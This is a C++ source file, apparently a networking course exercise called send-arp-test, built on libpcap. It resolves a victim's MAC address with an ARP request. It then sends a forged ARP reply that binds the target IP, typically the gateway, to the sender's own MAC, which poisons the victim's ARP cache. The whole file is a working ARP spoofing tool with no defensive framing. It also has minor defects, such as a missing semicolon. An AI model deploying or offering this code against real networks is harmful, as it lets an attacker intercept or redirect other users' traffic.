#include <stdio.h>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "get_addr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1 \n");
}

struct EthArpPacket make_packet(Mac ETH_dmac, Mac ETH_smac, Mac ARP_smac, Mac ARP_tmac, Ip ARP_sip, Ip ARP_tip, int type) { 

	EthArpPacket packet;

	packet.eth_.dmac_ = ETH_dmac;
	packet.eth_.smac_ = ETH_smac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;

	if(type == 1) packet.arp_.op_ = htons(ArpHdr::Request);
	else if(type == 2) packet.arp_.op_ = htons(ArpHdr::Reply);
	else {
		printf("Invalid type\n");
		exit(1);
	}

	packet.arp_.smac_ = ARP_smac;
	packet.arp_.sip_ = htonl(ARP_sip);
	packet.arp_.tmac_ = ARP_tmac;
	packet.arp_.tip_ = htonl(ARP_tip);

	return packet;
}

int main(int argc, char* argv[]) {
	if (argc % 2 != 0) {
		usage();
		return -1;
	}

	int i = 2;
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	char my_mac_str[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
	get_mac(my_mac_str, dev);
	Mac my_Mac = Mac(my_mac_str); 

	char my_ip_str[4] = {0x00, 0x00, 0x00, 0x00};
	get_ip(my_ip_str,dev);
	Ip my_Ip = Ip(my_ip_str);

	while (i < argc) {
		Ip senderIp = Ip(argv[i]);
		Ip targetIp = Ip(argv[i+1]);

		EthArpPacket packet;
		packet = make_packet(Mac("ff:ff:ff:ff:ff:ff"), my_Mac, my_Mac, Mac("00:00:00:00:00:00"), my_Ip, senderIp, 1);

		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle))

		EthArpPacket* recvPacket = NULL;

		while (true) {
			struct pcap_pkthdr *header;
			const u_char *packet;
			int res = pcap_next_ex(handle, &header, &packet);
			if (res == 0) continue;
			if (res == -1 || res == -2)
			{
				printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
				break;
			}

			recvPacket = (struct EthArpPacket*)packet; 
			if(recvPacket->eth_.type_ != htons(EthHdr::Arp)) continue;
			if(recvPacket->arp_.op_ != htons(ArpHdr::Reply)) continue;
			if(recvPacket->arp_.sip_ != htonl(senderIp)) continue;

			break;

		}

		Mac sender_mac = Mac(recvPacket->arp_.smac_); 
		packet = make_packet(sender_mac, my_Mac, my_Mac, sender_mac, targetIp, senderIp, 2);

		res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		i += 2;
	}
	pcap_close(handle);
}
